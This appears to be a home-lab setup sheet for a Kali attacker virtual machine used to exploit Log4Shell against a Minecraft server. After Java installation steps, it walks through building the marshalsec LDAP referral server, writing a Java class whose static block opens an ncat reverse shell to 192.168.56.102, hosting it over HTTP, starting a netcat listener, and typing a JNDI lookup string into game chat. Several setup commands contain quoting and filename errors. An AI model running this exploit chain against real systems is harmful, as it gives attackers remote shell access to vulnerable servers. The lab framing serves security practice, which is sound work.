Purpose/function:
The function of this machine is to host the LDAP server that the victim will connect to.

Hardware Settings:
Hosting hardware: Virtual box
Machine name: kali
OS: Linux 64 bit Debian Kali 5.15.0
Processor: 2 CPUs
Memory: 8 GB
Hard Disk: 80 GB

Network Settings:
Network Adapter 1: NAT
Network Adapter 2: Host only/ eth1
Ip Address: 
Netmask: 255.255.255.0

Software Configurations:

Openjdk version 1.8.0_181
Download jdk8 file from Oracle website:
https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html > jdk-8u1810linux-x64.tar.gz
Create and navigate to the jvm directory.
cd /usr/lib
mkdir jvm
cd jvm
Extract the files from the download.
Tar xvf *absolute path to jdk-8u1810linux-x64.tar.gz*
Modify the environment variables:
Sudo vim /etc/environment:
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/usr/lib/jvm/jdk1.8.0_181/bin:/usr/lib/jvm/jdk1.8.0_181/db/bin:/usr/lib/jvm/jdk1.8.0_181/jre/bin 
J2SDKDIR="/usr/lib/jvm/jdk1.8.0_181" 
J2REDIR=""/usr/lib/jvm/jdk1.8.0_181/jre" 
JAVA_HOME="/usr/lib/jvm/jdk1.8.0_181" 
DERBY_HOME="/usr/lib/jvm/jdk1.8.0_181/db"

Update the system to show javas location:
sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 0
sudo update-alternatives --install "/usr/bin/javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac 0 
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 0 “
sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac

Run java -version to confirm java version.

Log4j Exploit: 

mbechler/marshalsec (https://github.com/mbechler/marshalsec)

Overview:

This java program will start a LDAP server on our kali machine that will refer our jndi requests to our simple web server hosting the payload.

Steps:
Git clone https://github.com/mbechler/marshalsec

Sudo apt install maven (maven will make the exploit function)

mvn clean package -DskipTests
 
Git clone https://github.com/xiajun325/apache-log4j-rce-poc
 
Change the log4jrce.java file to initiate a reverse shell on the kali machine. 
 
Vim Log4jRCE.java
 
public class Log4jRCE { 
static { 
try { Runtime.getRuntime().exec("ncat -e /bin/bash 192.168.56.102 4343").waitFor(); 
} catch (Exception e) { 
e.printStackTrace();
 }}}

Starting the LDAP server:
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.56.102:8000/#Log4jRCE"
 
Start webserver in the directory where the log4jrce.java files is located. *important*
Python3 -m http.server

Start netcat listener to catch the reverse shell in Kali:
nc -nlvp 4343
 
From minecraft instance:
Type ‘t’ to talk and enter:
${jndi:ldap://192.168.56.102:1389/Log4jRCE}
 
